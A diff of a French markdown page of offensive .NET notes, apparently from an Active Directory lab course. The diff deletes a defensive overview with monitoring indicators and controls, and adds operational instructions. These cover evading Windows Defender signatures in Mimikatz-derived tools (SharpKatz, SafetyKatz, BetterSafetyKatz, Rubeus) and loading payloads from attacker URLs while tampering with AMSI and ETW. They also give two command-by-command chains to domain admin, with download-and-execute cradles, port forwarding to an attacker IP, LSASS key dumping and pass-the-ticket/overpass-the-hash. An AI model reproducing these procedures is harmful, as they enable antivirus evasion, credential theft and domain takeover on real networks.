@@ -4,83 +4,211 @@ title: "4 - Offensive .NET"
 
 # Offensive .NET
 
-## Outils .NET
+**Dépôt regroupant des outils populaires développés en C# pour le Red Team :**
 
-Les outils développés en C# peuvent interagir avec Windows, Active Directory et les mécanismes d'authentification. Leur exécution peut prendre la forme d'un binaire .NET ou d'un chargement en mémoire.
+[SharpCollection on GitHub](https://github.com/Flangvik/SharpCollection)
 
-## Détection antivirus
+[Mimikatz on GitHub](https://github.com/gentilkiwi/mimikatz)
 
-Les notes d'origine présentent plusieurs méthodes qui modifient la forme d'un binaire : obfuscation, modification de chaînes, compression et intégration de contenu dans un programme.
 
-Ces modifications peuvent changer les indicateurs statiques d'un fichier. Elles ne changent pas nécessairement son comportement à l'exécution.
+## Techniques - Contournement de l'antivirus (AV Bypass)
 
-### DefenderCheck
+> Nous allons principalement nous intéresser au contournement des détections par signature de Windows Defender.
 
-DefenderCheck sert à identifier les parties d'un binaire susceptibles de déclencher une détection Windows Defender. Dans un audit défensif, ces résultats aident à comprendre les éléments signalés par l'antivirus.
+Pour cela, différentes techniques peuvent être utilisées, notamment l'obfuscation et la manipulation de chaînes de caractères.
+
+Nous pouvons utiliser DefenderCheck :
+
+[DefenderCheck on GitHub](https://github.com/matterpreter/DefenderCheck)
+
+> Cet outil permet d'identifier les portions de code et les chaînes d'un binaire susceptibles d'être signalées par Windows Defender.
+
+Ces informations permettent d'identifier les éléments à l'origine d'une détection et d'étudier les modifications apportées au code source.
+
 
 ### SharpKatz
 
-SharpKatz est un outil .NET qui reprend certaines fonctionnalités de Mimikatz. Les usages présentés dans les notes concernent des données d'authentification Windows.
+Vérifier les signatures détectées dans SharpKatz.exe à l'aide de DefenderCheck :
+```powershell
+DefenderCheck.exe <Path to Sharpkatz binary>
+```
 
-### SafetyKatz
+- Ouvrir le projet dans Visual Studio.
+- Appuyer sur **CTRL + H**.
+- Rechercher et remplacer la chaîne "Credentials" par "Credents". Une autre chaîne peut être utilisée en remplacement. (Vérifier que cette chaîne n'est pas déjà présente dans le code.)
+- Sélectionner **Entire Solution** dans le champ de portée.
+- Cliquer sur le bouton **Replace All**.
+- Compiler le projet, puis vérifier à nouveau le binaire avec *DefenderCheck*.
+- Répéter les étapes précédentes si une détection persiste.
 
-SafetyKatz associe des fonctionnalités de Mimikatz à un mécanisme de chargement en mémoire. Les notes d'origine décrivent également l'utilisation d'un contenu compressé.
+### Safetykatz
+
+Pour SafetyKatz, les étapes suivantes ont été utilisées :
+- Télécharger la dernière version de Mimikatz ainsi que **Out-CompressedDll.ps1**.
+
+Exécuter le script PowerShell Out-CompressedDll.ps1 sur le binaire Mimikatz et enregistrer le résultat dans un fichier :
+```powershell
+Out-CompressedDll <Path to mimikatz.exe> > 	outputfilename.txt
+```	
+
+[Out-CompressedDll.ps1 in PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-CompressedDll.ps1)
+
+
+- Copier la valeur de la variable **$EncodedCompressedFile** depuis le fichier de sortie et remplacer la valeur de la variable **compressedMimikatzString** dans le fichier **Constants.cs** de SafetyKatz.
+
+- Copier la taille en octets depuis le fichier de sortie et la remplacer dans le fichier **Program.cs**, aux lignes 111 et 116.
+- Compiler le projet et vérifier à nouveau le binaire avec *DefenderCheck*.
 
 ### BetterSafetyKatz
 
-Les notes présentent une variante qui intègre le contenu d'une archive directement dans le programme. Cette méthode modifie le mode de stockage et de chargement du binaire.
+Pour BetterSafetyKatz, les étapes suivantes ont été utilisées :
+- Télécharger la dernière version du fichier "mimikatz_trunk.zip".
+- Convertir le fichier en valeur Base64.
+
+![Capture d’écran](./assets/3.png)
+
+
+
+
+Modifier le fichier **Program.cs**.
+
+– Ajouter une nouvelle variable contenant la valeur Base64 du fichier **mimikatz_trunk.zip**.
+– Commenter le code qui télécharge ou accepte le fichier Mimikatz en argument.
+– Convertir la chaîne Base64 en octets et la transmettre à la variable **zipStream**.
+
+![Capture d’écran](./assets/4.png)
+
+
+
 
 ### Rubeus
 
-Rubeus est un outil orienté Kerberos. Les notes d'origine mentionnent l'obfuscation de son binaire et la modification de métadonnées d'assembly.
+Pour Rubeus.exe, **ConfuserEx** a été utilisé afin d'obfusquer le binaire.
 
-## Payload Delivery
+[ConfuserEx on GitHub](https://github.com/mkaring/ConfuserEx)
 
-Les notes présentent NetLoader et AssemblyLoad comme des outils de chargement de binaires depuis un chemin local ou une URL.
 
-NetLoader est également associé à des modifications d'AMSI et d'ETW. Ces mécanismes sont sensibles, car ils peuvent réduire la visibilité des outils de sécurité sur l'exécution PowerShell et .NET.
+Lancer ConfuserEx :
+- Dans l'onglet **Project**, sélectionner le répertoire de base contenant le binaire.
+- Dans l'onglet **Project**, sélectionner le fichier binaire à obfusquer.
+- Dans l'onglet **Settings**, ajouter les règles.
+- Dans l'onglet **Settings**, modifier la règle et sélectionner le préréglage **Normal**.
+- Dans l'onglet **Protect**, cliquer sur le bouton **Protect**.
 
-### Indicateurs à surveiller
+> Le nouveau binaire obfusqué se trouve dans le dossier Confused, sous le répertoire de base.
 
-- Chargement inattendu d'assemblies .NET en mémoire.
-- Exécution de binaires depuis des répertoires inhabituels ou des URL distantes.
-- Modifications inattendues des mécanismes AMSI et ETW.
-- Connexions réseau initiées par un processus qui n'en a pas habituellement besoin.
+![Capture d’écran](./assets/5.png)
 
-## Chemins de compromission du laboratoire
 
-Les deux scénarios ci-dessous sont décrits au niveau des mécanismes et des traces à rechercher. Les commandes de contournement, de chargement furtif et d'extraction d'identifiants ne sont pas reproduites.
 
-### Scénario 1 - dcorp-ci
+- Après l'obfuscation du binaire avec ConfuserEx, une nouvelle analyse avec DefenderCheck permet de constater la détection du GUID.
+- Générer et modifier le GUID, compiler à nouveau Rubeus, puis relancer ConfuserEx sur le binaire Rubeus.exe.
 
-Le scénario associe l'administration distante via WinRM, le transfert d'un binaire, une redirection de port locale et l'accès à des données d'authentification. Il se termine par l'utilisation de matériel Kerberos associé à un compte privilégié.
+![Capture d’écran](./assets/6.png)
 
-**Points de surveillance**
 
-- Sessions WinRM inattendues et commandes distantes inhabituelles.
-- Copie de binaires vers des partages administratifs.
-- Modification de la configuration portproxy.
-- Accès anormal au processus LSASS.
-- Activité Kerberos inhabituelle liée à des comptes privilégiés.
 
-### Scénario 2 - Droits administrateur locaux indirects
+## Payload Delivery     
 
-Ce scénario part d'un compte disposant de droits administrateur locaux sur une machine. Il examine ensuite les possibilités d'administration distante, les restrictions du langage PowerShell et les règles AppLocker.
 
-La présence de droits administrateur locaux sur une machine ne donne pas automatiquement des privilèges sur le domaine. Le risque apparaît lorsque ces droits permettent d'accéder à une autre machine ou à une session contenant des données d'authentification sensibles.
+NetLoader peut être utilisé pour charger des payloads binaires.
 
-**Points de surveillance**
+[NetLoader on GitHub](https://github.com/Flangvik/NetLoader)
 
-- Utilisation inhabituelle de PowerShell Remoting.
-- Restrictions Constrained Language et règles AppLocker modifiées ou contournées.
-- Copie de scripts ou d'outils d'administration vers des machines distantes.
-- Accès à LSASS et utilisation de tickets Kerberos depuis une session inattendue.
 
-## Contrôles défensifs
+Il peut charger un binaire depuis un chemin local ou une URL et modifier AMSI et ETW pendant son exécution :
+```powershell
+C:\Users\Public\Loader.exe -path http://192.168.100.X/SafetyKatz.exe
+```
 
-- Limiter les comptes disposant de droits administrateur locaux.
-- Restreindre et journaliser l'administration distante.
-- Appliquer les règles AppLocker et contrôler leur modification.
-- Surveiller les accès à LSASS et les chargements .NET inhabituels.
-- Contrôler les modifications d'AMSI, d'ETW et de la configuration réseau.
-- Corréler les événements PowerShell, WinRM, Defender et Kerberos.
+AssemblyLoad.exe permet également de charger NetLoader en mémoire depuis une URL. NetLoader charge ensuite un binaire depuis un chemin local ou une URL :
+```powershell
+C:\Users\Public\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http://192.168.100.X/SafetyKatz.exe
+```
+
+### [1] - Obtention des privilèges Domain Admin via dcorp-ci
+```powershell
+iex (iwr http://<ip>/sbloggingbypass.txt -UseBasicParsing)
+# bypass ASMI manually
+iex ((New-Object Net.WebClient).DownloadString('http://<ip>/PowerView.ps1'))
+FInd-DomainUserLocation
+winrs -r:<machine> <command> //example winrs -r:dcorp-mgmt hostname;whoami
+iwr http://<ip>/Loader.exe -OutfFile C:\Users\Public\Loader.exe
+echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
+```
+
+
+> [NOTE] Windows Defender bloque tous les binaires et exécutables téléchargés depuis des sources distantes.
+So, we will configure a portforward to request payload from local loopback. 
+
+> Même si Defender surveille cette activité, le payload n'est pas téléchargé directement depuis une source distante et n'est donc pas bloqué.
+
+```powershell
+$null | winrs -r:dcorp-mgmt “netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<attacker IP>”
+$null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
+```
+
+Créer une nouvelle session PowerShell avec un niveau d'intégrité élevé :
+```powershell
+Rubeus.exe asktgt /user:svcadmin /aes256:<dc hash> /opsec /creanetonly:C:\windows\System32\cmd.exe /show /ptt
+```
+
+
+### [2] - Obtention des privilèges Domain Admin via des droits administrateur locaux indirects
+
+```powershell
+. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
+Find-PSRemotingLocalAdminAccess -Verbose
+
+Enter-PSSession <the machine we have local admin access>
+```
+
+> Il faut ici contourner AMSI, mais le shell utilise le mode **ConstrainedLanguage**.
+
+```powershell
+$ExecutionContext.SessionState.LanguageMode
+```
+
+> Il faut rechercher quelle stratégie nous bloque : **AppLocker**, **WDigest**.
+ 
+ ```powershell  
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+```
+ou
+```powershell
+reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2 # "AppLocker = Software Restrict Policy Version 2"
+```
+
+Copions MimiEx sur la machine cible.
+
+Depuis la machine d'attaque :
+```powershell
+Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
+```
+
+> Se reconnecter à la machine avec une PSSession et exécuter MimiEx.ps1.
+
+
+Depuis la machine d'attaque :
+```powershell
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe “sekurlsa::opassth” /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:<hash> /run:cmd.exe" “exit”
+```
+
+- Cette commande ouvre un shell avec le hash obtenu à l'aide de **MimiEx**.
+- Identifier d'abord les machines sur lesquelles cet utilisateur dispose de droits administrateur locaux.
+
+> [EXTRA] **Session: Service From 0** signifie qu'un service utilise ce compte comme compte de service.
+> Il peut donc exister un mot de passe en clair mis en cache dans les résultats de Mimikatz.
+
+
+
+Dans le nouveau shell :
+```powershell
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
+Find-PSRemotingLocalAdminAccess -Verbose
+```
+
+> À ce stade, il est possible d'accéder aux identifiants et de les extraire comme dans le scénario précédent.
+> Ouvrir une redirection de port et effectuer l'extraction via l'interface loopback                                          ]
+
